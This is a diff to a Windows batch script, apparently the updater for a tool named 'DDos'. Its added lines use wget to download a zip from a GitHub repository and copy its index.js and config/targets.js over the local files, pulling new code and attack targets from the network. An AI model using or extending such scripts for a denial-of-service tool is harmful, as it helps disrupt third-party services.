@@ -1,8 +1,22 @@
 @echo off
 setlocal
-cd /d %~dp0
-Call :UnZipFile "%~dp0" "%~dp0%1"
+
+rd /s /q .\DDos-master
+del master.zip
+
+echo Start download
+wget.exe https://github.com/KT-71/DDos/archive/refs/heads/master.zip
+Call :UnZipFile "%~dp0" "%~dp0master.zip"
+
+xcopy .\DDos-master\index.js .\index.js /Y
+xcopy .\DDos-master\config\targets.js .\config\targets.js
+
+rd /s /q .\DDos-master
+del master.zip
+
+pause
 exit /b
+
 
 :UnZipFile <ExtractTo> <newzipfile>
 set vbs="%temp%\_.vbs"
